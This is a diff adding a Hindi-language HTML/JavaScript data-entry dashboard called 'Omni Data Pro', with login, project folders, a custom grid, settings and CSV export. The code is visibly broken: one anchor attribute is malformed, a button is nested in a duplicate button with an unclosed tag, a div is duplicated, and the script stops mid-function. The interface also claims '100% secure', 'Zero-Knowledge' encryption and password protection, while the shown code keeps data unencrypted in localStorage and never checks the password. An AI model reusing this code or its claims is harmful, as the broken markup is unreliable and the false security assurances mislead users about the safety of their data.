@@ -1,0 +1,781 @@
+<!DOCTYPE html>
+<html lang="hi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Omni Data Pro - Private Edition</title>
+    <!-- Tailwind CSS -->
+    <script src="https://cdn.jsdelivr.net/npm/@tailwindcss/browser@4"></script>
+    <!-- FontAwesome Icons -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+</head>
+<body class="bg-gray-100 font-sans h-screen overflow-hidden m-0 p-0">
+
+    <!-- ========================================================== -->
+    <!-- 1. लॉगिन और साइन-अप इंटरफेस (लोकल-ओनली सुरक्षा) -->
+    <!-- ========================================================== -->
+    <div id="auth-interface" class="fixed inset-0 bg-slate-900 flex items-center justify-center z-50 overflow-y-auto p-4">
+        <div class="bg-white p-6 rounded-2xl shadow-2xl w-full max-w-md mx-auto my-auto">
+            <div class="text-center mb-4">
+                <h1 class="text-3xl font-bold text-slate-800 tracking-wide">Omni Data Pro</h1>
+                <p id="auth-subtitle" class="text-gray-500 text-sm mt-1">100% सुरक्षित और गुप्त डेटा एंट्री प्लेटफॉर्म</p>
+            </div>
+
+            <!-- लॉगिन बॉक्स -->
+            <div id="login-box" class="space-y-4">
+                <div class="p-2.5 bg-amber-50 border border-amber-200 rounded-lg text-[11px] text-amber-700 flex items-start gap-2">
+                    <i class="fa-solid fa-shield-halved mt-0.5"></i>
+                    <span><strong>गोपनीयता सूचना:</strong> आपका डेटा पूरी तरह गुप्त है। आपका काम केवल इसी ब्राउज़र में सुरक्षित रहता है, इसे कोई और नहीं देख सकता।</span>
+                </div>
+                
+                <form id="login-form" class="space-y-3">
+                    <div>
+                        <label class="block text-xs font-semibold text-gray-700 mb-1">यूजरनेम या ईमेल</label>
+                        <input type="text" id="login-username" required placeholder="Enter username" class="w-full px-3 py-2 border border-gray-300 rounded-lg text-sm outline-none">
+                    </div>
+                    <div>
+                        <div class="flex justify-between items-center mb-1">
+                            <label class="block text-xs font-semibold text-gray-700">पासवर्ड</label>
+                            <a href="#"('सुरक्षा कारणों से पासवर्ड केवल लोकल ब्राउज़र से ही रीसेट किया जा सकता है!')" class="text-[11px] text-sky-600 hover:underline">पासवर्ड भूल गए?</a>
+                        </div>
+                        <input type="password" required placeholder="••••••••" class="w-full px-3 py-2 border border-gray-300 rounded-lg text-sm outline-none">
+                    </div>
+                    <button type="submit" class="w-full bg-sky-600 hover:bg-sky-700 text-white font-medium py-2 rounded-lg text-sm shadow">डैशबोर्ड में प्रवेश करें</button>
+                </form>
+                
+                <!-- साइन अप लिंक -->
+                <div id="signup-container" class="text-center text-xs text-gray-500 pt-2 border-t border-gray-100">
+                    नया अकाउंट बनाना है? <a href="#" onclick="registerNewUser()" class="text-sky-600 font-semibold hover:underline">साइन अप करें</a>
+                </div>
+            </div>
+
+            <!-- ओनर डिटेल्स फुटर -->
+            <div class="mt-6 pt-4 border-t border-gray-150 flex items-center justify-between">
+                <div class="flex items-center gap-2">
+                    <div class="w-8 h-8 rounded-full bg-slate-200 flex items-center justify-center text-xs font-bold text-slate-700">M</div>
+                    <div class="text-left">
+                        <p class="text-[11px] font-bold text-gray-700 leading-tight">इरशाद अहमद</p>
+                        <p class="text-[9px] text-gray-400">Freelance Professional</p>
+                    </div>
+                </div>
+                <div class="text-sky-600 font-medium text-[11px] bg-sky-50 px-2 py-1 rounded-md">
+                    <i class="fa-solid fa-user-secret"></i> Zero-Knowledge Mode
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- ========================================================== -->
+    <!-- 2. मुख्य डैशबोर्ड इंटरफेस -->
+    <!-- ========================================================== -->
+    <div id="main-dashboard" class="hidden flex h-screen w-full relative">
+        
+        <!-- साइडबार मेनू -->
+        <aside id="sidebar" class="w-64 bg-slate-900 text-white flex flex-col justify-between p-4 shadow-xl shrink-0 fixed inset-y-0 left-0 z-40 transform -translate-x-full md:relative md:translate-x-0 transition-transform duration-300 ease-in-out overflow-y-auto">
+            <div class="space-y-5">
+                <div class="flex items-center justify-between border-b border-slate-700 pb-4">
+                    <span class="text-xl font-bold tracking-wider text-sky-400"><i class="fa-solid fa-chart-line"></i> Omni Data Pro</span>
+                    <button id="close-sidebar" class="md:hidden text-gray-400 hover:text-white p-1">
+                        <i class="fa-solid fa-xmark text-lg"></i>
+                    </button>
+                </div>
+                
+                <nav class="space-y-1.5">
+                    <a href="#" id="menu-dashboard" class="flex items-center gap-3 px-4 py-2 rounded-lg bg-slate-800 hover:bg-slate-800 transition text-xs">
+                        <i class="fa-solid fa-gauge-high text-sky-400 w-4"></i> डैशबोर्ड / होम
+                    </a>
+                    <a href="#" id="menu-projects" class="flex items-center gap-3 px-4 py-2 rounded-lg hover:bg-slate-800 transition text-xs">
+                        <i class="fa-solid fa-folder-open text-amber-400 w-4"></i> मेरे प्रोजेक्ट्स (फोल्डर्स)
+                    </a>
+                    <a href="#" id="menu-info" class="flex items-center gap-3 px-4 py-2 rounded-lg hover:bg-slate-800 transition text-xs">
+                        <i class="fa-solid fa-circle-info text-teal-400 w-4"></i> प्लेटफार्म इंफो डैशबोर्ड
+                    </a>
+                    <!-- सेटिंग और प्रोफाइल बटन -->
+                    <a href="#" id="menu-settings" class="flex items-center gap-3 px-4 py-2 rounded-lg hover:bg-slate-800 transition text-xs">
+                        <i class="fa-solid fa-gear text-purple-400 w-4"></i> यूजर प्रोफाइल और सेटिंग
+                    </a>
+                    </nav>
+
+    <!-- एआई फीचर बटन यहाँ जोड़ें -->
+    <button type="button" id="ai-btn-trigger" class="w-full flex items-center justify-center bg-sky-600 text-white p-3 rounded-lg">
+    <i class="fa-solid fa-wand-magic-sparkles mr-2"></i> AI Picture Feature
+    </button>
+              
+    </div>
+
+    <!-- मेरी सुरक्षित फ़ाइलें -->
+    <div class="pt-3 border-t ...">
+      
+
+                <!-- मेरी सुरक्षित फ़ाइलें -->
+                <div class="pt-3 border-t border-slate-700">
+                    <p class="text-[10px] font-bold text-gray-400 uppercase tracking-wider px-4 mb-2">मेरी सुरक्षित फ़ाइलें (Local)</p>
+                    <div id="saved-files-list" class="space-y-1 max-h-24 overflow-y-auto px-2 text-[11px] text-gray-300">
+                        <p class="text-gray-500 italic px-2 py-1">कोई फाइल सेव नहीं है</p>
+                    </div>
+                </div>
+
+                <!-- एक्सपोर्ट सेंटर -->
+                <div class="pt-3 border-t border-slate-700 space-y-1.5">
+                    <p class="text-[10px] font-bold text-gray-400 uppercase tracking-wider px-4">एक्सपोर्ट सेंटर</p>
+                    <button type="button" id="btn-export-csv" class="w-full flex items-center gap-2 bg-emerald-800/60 hover:bg-emerald-700 text-emerald-200 text-[11px] px-4 py-1.5 rounded-lg transition">
+                        <i class="fa-solid fa-file-excel"></i> Excel (CSV) डाउनलोड करें
+                    </button>
+                </div>
+
+                <!-- क्विक शॉर्टकट्स -->
+                <div class="pt-3 border-t border-slate-700 text-[11px] text-slate-400 bg-slate-950/40 p-2 rounded-lg">
+                    <p class="font-bold text-slate-300 mb-1"><i class="fa-regular fa-keyboard"></i> क्विक शॉर्टकट्स</p>
+                    <div class="space-y-1 text-[10px]">
+                        <div class="flex justify-between"><span>ग्रिड सेट:</span> <kbd class="bg-slate-800 px-1 rounded text-white font-mono">Alt + G</kbd></div>
+                        <div class="flex justify-between"><span>शीट सेव:</span> <kbd class="bg-slate-800 px-1 rounded text-white font-mono">Alt + S</kbd></div>
+                    </div>
+                </div>
+
+                <!-- ========================================================== -->
+                <!-- नई जोड़ी गई: वेबसाइट यूज़र गाइड (हेल्प सेंटर) -->
+                <!-- ========================================================== -->
+                <div class="pt-3 border-t border-slate-700">
+                    <p class="text-[10px] font-bold text-purple-400 uppercase tracking-wider px-4 mb-2"><i class="fa-solid fa-circle-question"></i> वेबसाइट को कैसे यूज़ करें?</p>
+                    <div class="bg-slate-950/60 rounded-xl p-3 space-y-3 text-[11px] text-gray-300 max-h-48 overflow-y-auto border border-purple-900/30">
+                        <div>
+                            <span class="text-purple-400 font-bold block mb-0.5">1. प्रोजेक्ट चुनें:</span>
+                            <p class="text-gray-400 leading-relaxed">साइडबार में <strong>'मेरे प्रोजेक्ट्स'</strong> पर क्लिक करके 10 प्रकार की किसी भी डेटा एंट्री सर्विस के फोल्डर को सेलेक्ट करें।</p>
+                        </div>
+                        <div>
+                            <span class="text-purple-400 font-bold block mb-0.5">2. ग्रिड कस्टमाइज़ करें:</span>
+                            <p class="text-gray-400 leading-relaxed">शीट खुलने पर अपनी सुविधानुसार कॉलम और लाइन (Rows) की संख्या भरकर <strong>'ग्रिड सेट करें'</strong> पर क्लिक करें।</p>
+                        </div>
+                        <div>
+                            <span class="text-purple-400 font-bold block mb-0.5">3. हेडिंग बदलें:</span>
+                            <p class="text-gray-400 leading-relaxed">ऊपर टेबल के किसी भी कॉलम के नाम (जैसे: कॉलम 1) पर क्लिक करके आप उसका नाम कस्टमाइज़ कर सकते हैं।</p>
+                        </div>
+                        <div>
+                            <span class="text-purple-400 font-bold block mb-0.5">4. सुरक्षित सेव करें:</span>
+                            <p class="text-gray-400 leading-relaxed">फ़ाइल का नाम भरें और <strong>'शीट सेव करें'</strong> दबाएं। यह आपके इसी ब्राउज़र की लोकल मेमोरी में परमानेंटली सुरक्षित हो जाएगी।</p>
+                        </div>
+                        <div>
+                            <span class="text-purple-400 font-bold block mb-0.5">5. एक्सेल डाउनलोड:</span>
+                            <p class="text-gray-400 leading-relaxed">अपने काम को एक्सेल फॉर्मेट में बाहर निकालने के लिए साइडबार के <strong>'Excel (CSV) डाउनलोड करें'</strong> बटन का उपयोग करें।</p>
+                        </div>
+                    </div>
+                </div>
+
+            </div>
+
+            <div class="mt-4 space-y-2">
+                <div class="px-4 py-1.5 bg-slate-950/50 rounded-lg flex items-center gap-2 text-xs text-gray-300">
+                    <i class="fa-solid fa-circle-user text-emerald-400"></i>
+                    <span class="truncate">यूजर: <strong id="sidebar-display-user">Guest</strong></span>
+                </div>
+                <button id="logout-btn" class="w-full flex items-center gap-3 px-4 py-2 rounded-lg hover:bg-red-900/40 text-red-400 transition text-left text-xs">
+                    <i class="fa-solid fa-right-from-bracket w-4"></i> लॉग आउट
+                </button>
+            </div>
+        </aside>
+
+        <!-- मोबाइल बैकड्रॉप -->
+        <div id="sidebar-backdrop" class="fixed inset-0 bg-black/50 z-30 hidden md:hidden"></div>
+
+        <!-- मुख्य वर्किंग एरिया -->
+        <main class="flex-1 flex flex-col overflow-hidden bg-slate-50 w-full">
+            
+            <!-- टॉप हेडर -->
+            <header class="bg-white border-b border-gray-200 p-4 flex justify-between items-center z-10 shrink-0">
+                <div class="flex items-center gap-3">
+                    <button id="toggle-sidebar" class="bg-slate-100 hover:bg-slate-200 text-slate-700 p-2 rounded-lg transition border border-gray-200">
+                        <i class="fa-solid fa-bars text-sm"></i>
+                    </button>
+                    <span class="text-xs bg-emerald-50 text-emerald-700 font-medium px-2 py-1 rounded-md border border-emerald-200">
+                        <i class="fa-solid fa-lock text-[10px]"></i> लोकल गुप्त मोड एक्टिव
+                    </span>
+                </div>
+                <div id="header-avatar" class="w-8 h-8 bg-sky-600 text-white rounded-full flex items-center justify-center font-bold text-xs">U</div>
+            </header>
+
+            <!-- सी) होम ओवरव्यू स्क्रीन -->
+            <div id="dashboard-screen" class="p-6 flex-1 overflow-y-auto">
+                <h2 class="text-base font-bold text-slate-800 mb-4">काम का विवरण (Overview)</h2>
+                <div class="grid grid-cols-1 sm:grid-cols-3 gap-4 mb-6">
+                    <div class="bg-white p-4 rounded-xl border border-gray-200 shadow-sm flex items-center gap-4">
+                        <div class="w-10 h-10 bg-sky-100 text-sky-600 rounded-lg flex items-center justify-center text-lg"><i class="fa-solid fa-file-invoice"></i></div>
+                        <div>
+                            <p class="text-[11px] text-gray-400 font-medium">कुल सेव फाइलें</p>
+                            <p id="stat-files-count" class="text-lg font-bold text-slate-800">0</p>
+                        </div>
+                    </div>
+                    <div class="bg-white p-4 rounded-xl border border-gray-200 shadow-sm flex items-center gap-4">
+                        <div class="w-10 h-10 bg-emerald-100 text-emerald-600 rounded-lg flex items-center justify-center text-lg"><i class="fa-solid fa-table-cells"></i></div>
+                        <div>
+                            <p class="text-[11px] text-gray-400 font-medium">आज बनाई गईं लाइनें (Rows)</p>
+                            <p class="text-lg font-bold text-slate-800" id="stat-total-rows">0</p>
+                        </div>
+                    </div>
+                    <div class="bg-white p-4 rounded-xl border border-gray-200 shadow-sm flex items-center gap-4">
+                        <div class="w-10 h-10 bg-amber-100 text-amber-600 rounded-lg flex items-center justify-center text-lg"><i class="fa-solid fa-circle-user"></i></div>
+                        <div>
+                            <p class="text-[11px] text-gray-400 font-medium">डेटा प्राइवेसी स्टेटस</p>
+                            <p class="text-[11px] font-bold text-emerald-600 mt-1"><i class="fa-solid fa-eye-slash text-[10px]"></i> 100% गुप्त मोड</p>
+                        </div>
+                    </div>
+                </div>
+                <button id="btn-start-project-shortcut" class="bg-sky-600 hover:bg-sky-700 text-white text-xs px-4 py-2 rounded-lg font-medium shadow">
+                    <i class="fa-solid fa-folder-plus"></i> नया डेटा एंट्री प्रोजेक्ट शुरू करें
+                </button>
+            </div>
+
+            <!-- डी) प्लेटफार्म इंफो डैशबोर्ड स्क्रीन -->
+            <div id="info-screen" class="p-6 flex-1 overflow-y-auto hidden">
+                <h2 class="text-base font-bold text-slate-800 mb-4"><i class="fa-solid fa-circle-info text-teal-600"></i> प्लेटफार्म इंफो डैशबोर्ड</h2>
+                
+                <div class="grid grid-cols-1 md:grid-cols-2 gap-6">
+                    <div class="bg-white p-5 rounded-xl border border-gray-200 shadow-sm space-y-3">
+                        <h3 class="text-xs font-bold text-slate-700 uppercase tracking-wider border-b pb-2"><i class="fa-solid fa-vault text-emerald-600"></i> प्राइवेसी और आर्किटेक्चर</h3>
+                        <ul class="space-y-2 text-xs text-gray-600">
+                            <li class="flex justify-between"><span>डेटा सिंक सर्वर:</span> <span class="font-bold text-red-600">None</span></li>
+                            <li class="flex justify-between"><span>डेटा विजिबिलिटी स्टेटस:</span> <span class="font-bold text-emerald-600"><i class="fa-solid fa-user-secret"></i> लोकल यूजर गुप्त मोड</span></li>
+                            <li class="flex justify-between"><span>एन्क्रिप्शन मोड:</span> <span class="font-bold text-slate-700">Zero-Knowledge</span></li>
+                            <li class="flex justify-between"><span>डेटाबेस टाइप:</span> <span class="font-bold text-blue-600">LocalStorage</span></li>
+                        </ul>
+                    </div>
+
+                    <div class="bg-white p-5 rounded-xl border border-gray-200 shadow-sm space-y-3">
+                        <h3 class="text-xs font-bold text-slate-700 uppercase tracking-wider border-b pb-2"><i class="fa-solid fa-gears text-sky-600"></i> तकनीकी इंजन</h3>
+                        <ul class="space-y-2 text-xs text-gray-600">
+                            <li class="flex justify-between"><span>सॉफ्टवेयर वर्जन:</span> <span class="font-mono bg-slate-100 px-1.5 py-0.5 rounded text-[11px]">Omni Engine v2.5</span></li>
+                            <li class="flex justify-between"><span>फ्रंटएंड फ्रेमवर्क:</span> <span class="font-semibold text-slate-700">Tailwind CSS v4</span></li>
+                            <li class="flex justify-between"><span>प्रोग्रामिंग लॉजिक:</span> <span class="font-semibold text-slate-700">Vanilla JS (ES6+)</span></li>
+                            <li class="flex justify-between"><span>फॉर्मेट:</span> <span class="font-bold text-emerald-600">CSV (Excel Compatible)</span></li>
+                        </ul>
+                    </div>
+                </div>
+            </div>
+
+            <!-- ई) यूजर प्रोफाइल और सेटिंग स्क्रीन -->
+            <div id="settings-screen" class="p-6 flex-1 overflow-y-auto hidden">
+                <h2 class="text-base font-bold text-slate-800 mb-4"><i class="fa-solid fa-gear text-purple-600"></i> यूजर प्रोफाइल और सेटिंग Center</h2>
+                
+                <div class="max-w-xl bg-white p-6 rounded-xl border border-gray-200 shadow-sm space-y-6">
+                    <!-- प्रोफाइल ब्लॉक -->
+                    <div class="flex items-center gap-4 border-b pb-4">
+                        <div class="w-14 h-14 rounded-full bg-purple-600 text-white flex items-center justify-center text-xl font-bold" id="profile-avatar">U</div>
+                        <div>
+                            <h3 class="text-sm font-bold text-slate-800" id="profile-name-display">Active User</h3>
+                            <p class="text-xs text-gray-400">अकाउंट टाइप: <span class="text-emerald-600 font-medium">लोकल सीक्रेट प्रोफाइल</span></p>
+                        </div>
+                    </div>
+                    
+                    <!-- सेटिंग्स कंट्रोल्स -->
+                    <div class="space-y-4">
+                        <h4 class="text-xs font-bold text-slate-700 uppercase tracking-wider">लोकल सेटिंग्स कस्टमाइजेशन</h4>
+                        
+                        <div class="space-y-3 text-xs">
+                            <div class="flex items-center justify-between p-3 bg-slate-50 rounded-lg">
+                                <div>
+                                    <p class="font-semibold text-gray-700">ऑटो-सेव ग्रिड डेटा</p>
+                                    <p class="text-[10px] text-gray-400">हर नया कॉलम या रो बनाने पर तुरंत सेव करें</p>
+                                </div>
+                                <input type="checkbox" checked class="w-4 h-4 accent-purple-600 cursor-pointer">
+                            </div>
+                            
+                            <div class="flex items-center justify-between p-3 bg-slate-50 rounded-lg">
+                                <div>
+                                    <p class="font-semibold text-gray-700">थीम मोड (Dark UI)</p>
+                                    <p class="text-[10px] text-gray-400">डार्क मोड इंटरफेस एक्टिवेट करें</p>
+                                </div>
+                                <button type="button" onclick="alert('डार्क थीम केवल प्रीमियम वर्जन में उपलब्ध है!')" class="text-purple-600 font-semibold hover:underline">चालू करें</button>
+                            </div>
+    <!-- एआई कंट्रोल पैनल -->
+    <div class="flex items-center justify-between p-3 border-b">
+        <div>
+            <p class="text-sm font-semibold">AI Picture Mode</p>
+            <p class="text-xs text-gray-500">एआई फीचर को चालू/बंद करें</p>
+        </div>
+        <input type="checkbox" id="ai-toggle">
+    </div>
+                          
+                            <div class="p-3 bg-red-50 text-red-700 rounded-lg border border-red-100 flex justify-between items-center">
+                                <div>
+                                    <p class="font-semibold">लोकल स्टोरेज रीसेट करें</p>
+                                    <p class="text-[10px] text-red-500">ऐसा करने से आपकी सभी फाइलें और यूजर आईडी पूरी तरह मिट जाएंगे।</p>
+                                </div>
+                                <button type="button" onclick="if(confirm('क्या आप सच में पूरी मेमोरी डिलीट करना चाहते हैं? इससे सारा डेटा गायब हो जाएगा।')){ localStorage.clear(); location.reload(); }" class="bg-red-600 hover:bg-red-700 text-white font-medium px-3 py-1.5 rounded transition text-[10px] shadow">डाटा डिलीट करें</button>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- ए) मुख्य सर्विसेज स्क्रीन (10 एक्टिव फोल्डर्स) -->
+            <div id="services-screen" class="p-6 flex-1 overflow-y-auto hidden">
+                <div class="flex items-center justify-between mb-4">
+                    <h2 class="text-base font-bold text-slate-800">डेटा एंट्री सर्विसेज</h2>
+                    <span class="text-xs text-gray-400">10 Active Folders</span>
+                </div>
+                
+                <div class="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 xl:grid-cols-4 gap-4">
+                    <div class="service-card bg-white p-4 rounded-xl border border-gray-200 shadow-sm hover:border-sky-400 transition cursor-pointer" data-name="बेसिक डेटा एंट्री">
+                        <div class="text-sky-500 text-lg mb-1.5"><i class="fa-solid fa-keyboard"></i></div>
+                        <h3 class="font-semibold text-xs text-slate-800">बेसिक डेटा एंट्री</h3>
+                    </div>
+                    <div class="service-card bg-white p-4 rounded-xl border border-gray-200 shadow-sm hover:border-emerald-400 transition cursor-pointer" data-name="ONLINE डेटा एंट्री">
+                        <div class="text-emerald-500 text-lg mb-1.5"><i class="fa-solid fa-globe"></i></div>
+                        <h3 class="font-semibold text-xs text-slate-800">ऑनलाइन डेटा एंट्री</h3>
+                    </div>
+                    <div class="service-card bg-white p-4 rounded-xl border border-gray-200 shadow-sm hover:border-amber-400 transition cursor-pointer" data-name="ईकॉमर्स-(कैटलॉग) डेटा एंट्री">
+                        <div class="text-amber-500 text-lg mb-1.5"><i class="fa-solid fa-cart-shopping"></i></div>
+                        <h3 class="font-semibold text-xs text-slate-800">ईकॉमर्स-(कैटलॉग) डेटा एंट्री</h3>
+                    </div>
+                    <div class="service-card bg-white p-4 rounded-xl border border-gray-200 shadow-sm hover:border-purple-400 transition cursor-pointer" data-name="डेटा ट्रांसक्रिप्शन">
+                        <div class="text-purple-500 text-lg mb-1.5"><i class="fa-solid fa-file-audio"></i></div>
+                        <h3 class="font-semibold text-xs text-slate-800">डेटा ट्रांसक्रिप्शन</h3>
+                    </div>
+                    <div class="service-card bg-white p-4 rounded-xl border border-gray-200 shadow-sm hover:border-rose-400 transition cursor-pointer" data-name="इमेज टू TEXT एंट्री">
+                        <div class="text-rose-500 text-lg mb-1.5"><i class="fa-solid fa-file-image"></i></div>
+                        <h3 class="font-semibold text-xs text-slate-800">इमेज टू TEXT एंट्री</h3>
+                    </div>
+                    <div class="service-card bg-white p-4 rounded-xl border border-gray-200 shadow-sm hover:border-indigo-400 transition cursor-pointer" data-name="वेब रिसर्च और डेटा माइनिंग">
+                        <div class="text-indigo-500 text-lg mb-1.5"><i class="fa-solid fa-magnifying-glass-chart"></i></div>
+                        <h3 class="font-semibold text-xs text-slate-800">वेब रिसर्च और डेटा माइनिंग</h3>
+                    </div>
+                    <div class="service-card bg-white p-4 rounded-xl border border-gray-200 shadow-sm hover:border-teal-400 transition cursor-pointer" data-name="डेटा क्लीनिंग">
+                        <div class="text-teal-500 text-lg mb-1.5"><i class="fa-solid fa-broom"></i></div>
+                        <h3 class="font-semibold text-xs text-slate-800">डेटा क्लीनिंग</h3>
+                    </div>
+                    <div class="service-card bg-white p-4 rounded-xl border border-gray-200 shadow-sm hover:border-orange-400 transition cursor-pointer" data-name="सर्वे और फॉर्म फिलिंग">
+                        <div class="text-orange-500 text-lg mb-1.5"><i class="fa-solid fa-list-check"></i></div>
+                        <h3 class="font-semibold text-xs text-slate-800">सर्वे और फॉर्म फिलिंग</h3>
+                    </div>
+                    <div class="service-card bg-white p-4 rounded-xl border border-gray-200 shadow-sm hover:border-red-400 transition cursor-pointer" data-name="मेडिकल डेटा एंट्री">
+                        <div class="text-red-500 text-lg mb-1.5"><i class="fa-solid fa-file-medical"></i></div>
+                        <h3 class="font-semibold text-xs text-slate-800">मेडिकल डेटा एंट्री</h3>
+                    </div>
+                    <div class="service-card bg-white p-4 rounded-xl border border-gray-200 shadow-sm hover:border-blue-400 transition cursor-pointer" data-name="लीगल डेटा एंट्री">
+                        <div class="text-blue-500 text-lg mb-1.5"><i class="fa-solid fa-scale-balanced"></i></div>
+                        <h3 class="font-semibold text-xs text-slate-800">लीगल डेटा एंट्री</h3>
+                    </div>
+                </div>
+            </div>
+
+            <!-- बी) मुख्य वर्किंग शीट -->
+            <div id="work-screen" class="p-4 flex-1 overflow-y-auto hidden">
+                <div class="bg-white rounded-xl shadow-md border border-gray-200 flex flex-col h-full min-h-[450px]">
+                    
+                    <!-- शीट कंट्रोल हेडर -->
+                    <div class="p-4 border-b border-gray-200 bg-slate-50 rounded-t-xl space-y-3">
+                        <div class="flex flex-wrap items-center justify-between gap-2">
+                            <div class="flex items-center gap-2">
+                                <div class="text-sky-600 text-xl"><i class="fa-solid fa-table"></i></div>
+                                <div>
+                                    <h2 id="current-folder-title" class="text-sm font-bold text-slate-800">सर्विस शीट</h2>
+                                    <p class="text-[10px] text-gray-400">टिप: हेडिंग बदलने के लिए कॉलम के नाम पर क्लिक करें</p>
+                                </div>
+                            </div>
+                            <button type="button" id="btn-save-sheet" class="bg-emerald-600 hover:bg-emerald-700 text-white text-[11px] px-3 py-1.5 rounded-lg font-medium shadow flex items-center gap-1">
+                                <i class="fa-solid fa-floppy-disk"></i> शीट सेव करें
+                            </button>
+                        </div>
+
+                        <!-- कस्टमाइज़ ग्रिड टूल्स -->
+                        <div class="bg-white p-3 rounded-lg border border-gray-200 flex flex-wrap items-center gap-4 text-xs">
+                            <div class="flex items-center gap-1.5">
+                                <span class="font-semibold text-gray-600">कॉलम संख्या:</span>
+                                <input type="number" id="input-cols" value="3" min="1" max="10" class="w-14 px-2 py-1 border border-gray-300 rounded text-center font-bold text-slate-800">
+                            </div>
+                            <div class="flex items-center gap-1.5">
+                                <span class="font-semibold text-gray-600">LINEएं (Rows):</span>
+                                <input type="number" id="input-rows" value="5" min="1" max="100" class="w-14 px-2 py-1 border border-gray-300 rounded text-center font-bold text-slate-800">
+                            </div>
+                            <button type="button" id="btn-generate-grid" class="bg-sky-600 hover:bg-sky-700 text-white font-medium px-3 py-1 rounded transition text-[11px] mr-2">
+                                <i class="fa-solid fa-sliders"></i> ग्रिड सेट करें
+                            </button>
+                            
+                            <div class="flex items-center gap-1.5 border-l border-gray-300 pl-4 flex-1 min-w-[200px]">
+                                <span class="font-semibold text-slate-700"><i class="fa-solid fa-file-pen text-amber-500"></i> फ़ाइल का नाम:</span>
+                                <input type="text" id="input-file-name" placeholder="फ़ाइल का नाम दर्ज करें..." class="flex-1 px-3 py-1 border border-gray-300 rounded text-slate-800 font-medium focus:outline-none focus:ring-1 focus:ring-sky-500 bg-slate-50">
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <!-- लाइव स्प्रेडशीट टेबल -->
+                    <div class="flex-1 overflow-auto p-4">
+                        <table class="w-full text-left border-collapse border border-gray-300 text-xs">
+                            <thead id="dynamic-thead"></thead>
+                            <tbody id="dynamic-tbody"></tbody>
+                        </table>
+                    </div>
+
+                    <div class="p-2 border-t border-gray-200 bg-slate-50 rounded-b-xl flex justify-between items-center text-[11px] text-gray-600 px-4">
+                        <div><i class="fa-solid fa-calculator text-sky-500"></i> एक्टिव वर्किंग लाइनें: <span id="live-row-counter" class="font-bold text-slate-800">0</span></div>
+                        <div class="text-[10px] text-gray-400"><i class="fa-solid fa-user-secret"></i> डेटा केवल लोकल स्टोर हो रहा है</div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- बॉटम बार -->
+            <footer class="p-3 bg-white border-t border-gray-200 flex justify-between items-center shrink-0">
+                <button type="button" id="footer-back-btn" class="text-xs bg-gray-100 hover:bg-gray-200 text-gray-700 font-medium px-4 py-1.5 rounded-lg border border-gray-300 transition flex items-center gap-1">
+                    <i class="fa-solid fa-arrow-left text-[10px]"></i> back button
+                </button>
+                <button type="button" onclick="startAIGeneration()" class="text-xs bg-gray-100 hover:bg-gray-200 p-2 rounded-lg flex items-center gap-2">
+                   <button type="button" onclick="startAIGeneration()" class="text-xs bg-gray-100 hover:bg-gray-200 p-2 rounded-lg flex items-center gap-2">
+    <i 
+                </button>
+            </footer>
+        </main>
+    </div>
+
+    <!-- ========================================================== -->
+    <!-- 3. जावास्क्रिप्ट (लॉजिक इंजन) -->
+    <!-- ========================================================== -->
+    <script>
+        const authInterface = document.getElementById('auth-interface');
+        const mainDashboard = document.getElementById('main-dashboard');
+        const loginBox = document.getElementById('login-box');
+
+        const dashboardScreen = document.getElementById('dashboard-screen');
+        const servicesScreen = document.getElementById('services-screen');
+        const workScreen = document.getElementById('work-screen');
+        const infoScreen = document.getElementById('info-screen');
+        const settingsScreen = document.getElementById('settings-screen');
+        const currentFolderTitle = document.getElementById('current-folder-title');
+
+        const sidebar = document.getElementById('sidebar');
+        const toggleSidebarBtn = document.getElementById('toggle-sidebar');
+        const closeSidebarBtn = document.getElementById('close-sidebar');
+        const backdrop = document.getElementById('sidebar-backdrop');
+
+        const inputCols = document.getElementById('input-cols');
+        const inputRows = document.getElementById('input-rows');
+        const btnGenerateGrid = document.getElementById('btn-generate-grid');
+        const dynamicThead = document.getElementById('dynamic-thead');
+        const dynamicTbody = document.getElementById('dynamic-tbody');
+        const inputFileName = document.getElementById('input-file-name');
+        const btnSaveSheet = document.getElementById('btn-save-sheet');
+        
+        const savedFilesList = document.getElementById('saved-files-list');
+        const liveRowCounter = document.getElementById('live-row-counter');
+        const statFilesCount = document.getElementById('stat-files-count');
+        const statTotalRows = document.getElementById('stat-total-rows');
+
+        let savedFilesDB = {}; 
+        let globalRowCountAccumulator = 0;
+
+        // यूजर स्टेटस चेक और डायनेमिक अवतार
+        function checkUserStatus() {
+            const existingUser = localStorage.getItem('registeredUser');
+            const signupBox = document.getElementById('signup-container');
+            const sidebarUser = document.getElementById('sidebar-display-user');
+            const pNameDisplay = document.getElementById('profile-name-display');
+            const headAvatar = document.getElementById('header-avatar');
+            const profAvatar = document.getElementById('profile-avatar');
+            
+            if (existingUser) {
+                if(signupBox) signupBox.style.display = 'none';
+                if(sidebarUser) sidebarUser.innerText = existingUser;
+                if(pNameDisplay) pNameDisplay.innerText = existingUser;
+                
+                let firstChar = existingUser.charAt(0).toUpperCase();
+                if(headAvatar) headAvatar.innerText = firstChar;
+                if(profAvatar) profAvatar.innerText = firstChar;
+            } else {
+                if(signupBox) signupBox.style.display = 'block';
+                if(sidebarUser) sidebarUser.innerText = "Guest User";
+                if(pNameDisplay) pNameDisplay.innerText = "Guest User";
+            }
+        }
+
+        function registerNewUser() {
+            const username = prompt("अपना नया यूजरनेम या ईमेल दर्ज करें:");
+            if (username && username.trim() !== "") {
+                localStorage.setItem('registeredUser', username.trim());
+                alert("अकाउंट सफलतापूर्वक बन गया! अब आप लॉगिन कर सकते.");
+                checkUserStatus(); 
+                document.getElementById('login-username').value = username.trim();
+            }
+        }
+
+        // डायनेमिक ग्रिड जनरेटर
+        function generateCustomGrid() {
+            const colsCount = parseInt(inputCols.value) || 3;
+            const rowsCount = parseInt(inputRows.value) || 5;
+            liveRowCounter.innerText = rowsCount;
+
+            dynamicThead.innerHTML = '';
+            const headerTr = document.createElement('tr');
+            headerTr.className = "bg-slate-100 text-gray-700 font-semibold";
+            
+            const thSr = document.createElement('th');
+            thSr.className = "border border-gray-300 p-2 w-12 text-center select-none";
+            thSr.innerText = "क्र.सं.";
+            headerTr.appendChild(thSr);
+
